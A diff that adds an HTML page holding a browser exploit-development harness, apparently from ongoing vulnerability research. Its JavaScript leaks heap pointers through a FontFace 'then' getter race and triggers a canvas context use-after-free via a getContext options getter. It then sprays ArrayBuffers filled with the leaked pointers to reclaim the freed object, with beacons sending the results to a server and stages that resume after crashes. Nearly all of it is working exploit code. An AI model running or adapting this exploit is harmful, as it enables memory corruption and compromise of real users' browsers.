@@ -1,0 +1,198 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1160 - All-Pointer Fill Discriminator</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
+h2{color:#00ff88;font-size:14px;margin:6px 0}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<h2>P1160 All-Pointer Fill Discriminator</h2>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),T0=Date.now();
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1160-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu;
+try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}return String(v);}
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1160: P1159 showed every mixed-pattern AB(768-896) crash at the read
+   (same-type control survives). Two hypotheses remain:
+   (a) cross-type reclaim never happens -> destructor-nulled fields -> NULL deref
+   (b) reclaim happens but the read path derefs a POINTER slot (m_state or
+       similar) that our mixed fills left as garbage -> crash.
+   If (b) is true, filling EVERY qword with the SAME VALID heap pointer
+   (FL-leaked p1) should make the read deref p1+off = mapped -> SURVIVE.
+   If (a) is true, every fill still crashes.
+
+   Stages (crash-resume; PREREAD beacon localizes the crash point):
+   0: all-p1  AB(768)   -> read lineWidth
+   1: all-p2  AB(768)
+   2: all-p1  AB(800)
+   3: all-p1, qword0=0 (vtable nulled) AB(768)
+   4: all-p1  AB(768), read miterLimit FIRST then lineWidth
+   5: all-p1  AB(768), fill half p1 / half p2
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=[
+  {sz:768,fq:'p1'},
+  {sz:768,fq:'p2'},
+  {sz:800,fq:'p1'},
+  {sz:768,fq:'p1_novt'},
+  {sz:768,fq:'p1_mlfirst'},
+  {sz:768,fq:'half'}
+];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1160_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1160_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+
+B('BOOT','stage='+stage+'/'+STAGES.length+'|res='+JSON.stringify(results).slice(0,400));
+
+if(stage>=STAGES.length){
+  B('ALL-DONE',JSON.stringify(results).slice(0,800));
+  log('=== ALL DONE ===','ok');
+  try{localStorage.removeItem('p1160_stage');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1160_stage',''+(stage+1));}catch(e){}
+var conf=STAGES[stage];
+B('STAGE','n='+stage+'|sz='+conf.sz+'|fill='+conf.fq);
+
+/* 1. FL leak for p1/p2 */
+function flLeak(cb){
+  var done=false;
+  var watchdog=setTimeout(function(){if(done)return;done=true;cb(null);},6000);
+  function fin(p){if(done)return;done=true;clearTimeout(watchdog);
+    try{delete FontFace.prototype.then;}catch(e){}cb(p);}
+  try{
+    var fired=false,styleEl;
+    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A);void A.loaded;
+    styleEl=document.createElement('style');
+    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(styleEl);
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){
+        if(fired)return undefined;fired=true;
+        if(styleEl)styleEl.remove();
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        window.__map=[];
+        for(var k=0;k<120;k++){var ab=new ArrayBuffer(192);
+          window.__map.push({view:new Uint8Array(ab)});}
+        try{document.fonts.check('1em s0');}catch(e){}
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em f0, s0','AB');
+    setTimeout(function(){
+      var found=null;
+      for(var pass=0;pass<3&&!found;pass++){
+        for(var i=0;i<window.__map.length&&!found;i++){
+          var e=window.__map[i];
+          var nz=false;for(var b=0x58;b<0x60;b++)if(e.view[b])nz=true;
+          if(nz){
+            var dv=new DataView(e.view.buffer);
+            var p1=dv.getBigUint64(0x58,true),p2=dv.getBigUint64(0x68,true);
+            if(p1>0x1000000000n&&p1<0x100000000000n){
+              found={lo1:Number(p1&0xFFFFFFFFn),hi1:Number((p1>>32n)&0xFFFFFFFFn),
+                lo2:Number(p2&0x32n?p2&0xFFFFFFFFn:0),hi2:Number((p2>>32n)&0xFFFFFFFFn)};
+            }
+          }
+        }
+      }
+      B(found?'FL-HIT':'FL-MISS',found?('p1hi='+found.hi1.toString(16)+'|p1lo='+found.lo1.toString(16)):'');
+      fin(found);
+    },80);
+  }catch(e){B('FL-ERR',e.message);fin(null);}
+}
+
+flLeak(function(leak){
+  if(!leak){B('NORETRY-RELOAD');setTimeout(function(){location.reload(true);},400);return;}
+
+  /* 2. UAF */
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var innerCtx=null;
+  var uafOpts={};
+  Object.defineProperty(uafOpts,'alpha',{get:function(){
+    innerCtx=canvas.getContext('2d');return true;}});
+  canvas.getContext('bitmaprenderer',uafOpts);
+  B('UAF','inner='+(innerCtx?'OK':'NULL'));
+  if(!innerCtx){B('FAIL');setTimeout(function(){location.reload(true);},1500);return;}
+
+  /* 3. flush + spray */
+  for(var f=0;f<600;f++){var tmp=new ArrayBuffer(16);}
+  var dvs=[];
+  for(var s=0;s<200;s++){
+    var ab=new ArrayBuffer(conf.sz);
+    var dv=new DataView(ab);
+    var nq=conf.sz>>3;
+    for(var q=0;q<nq;q++){
+      var useP2 = (conf.fq==='p2')||(conf.fq==='half'&&q>=nq/2);
+      var lo=useP2?leak.lo2:leak.lo1;
+      var hi=useP2?leak.hi2:leak.hi1;
+      if(conf.fq==='p1_novt'&&q===0){lo=0;hi=0;}
+      dv.setUint32(q*8,lo,true);
+      dv.setUint32(q*8+4,hi,true);
+    }
+    dvs.push(dv);
+  }
+  B('SPRAY','done');
+
+  /* 4. PREREAD localization beacon */
+  B('PREREAD','go');
+
+  /* 5. CRITICAL READS */
+  var out={};
+  function rd(name,fn){
+    try{var v=fn();out[name]=f2big(v);B('RD-'+name,out[name]);}
+    catch(e){out[name]='ERR:'+String(e.message).slice(0,16);B('RD-'+name,out[name]);}
+  }
+  if(conf.fq==='p1_mlfirst'){rd('miterLimit',function(){return innerCtx.miterLimit;});}
+  rd('lineWidth',function(){return innerCtx.lineWidth;});
+  rd('globalAlpha',function(){return innerCtx.globalAlpha;});
+  rd('shadowBlur',function(){return innerCtx.shadowBlur;});
+  B('POSTREAD','done');
+
+  results.push({stage:stage,fill:conf.fq,sz:conf.sz,out:out});
+  try{localStorage.setItem('p1160_res',JSON.stringify(results));}catch(e){}
+  log('stage '+stage+' OUT: '+JSON.stringify(out),out.lineWidth&&out.lineWidth.indexOf('ERR')<0?'hit':'warn');
+
+  innerCtx=null;dvs=null;
+  B('NEXT');setTimeout(function(){location.reload(true);},1200);
+});
+
+} /* end stage machine */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1160-allptr-fill';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
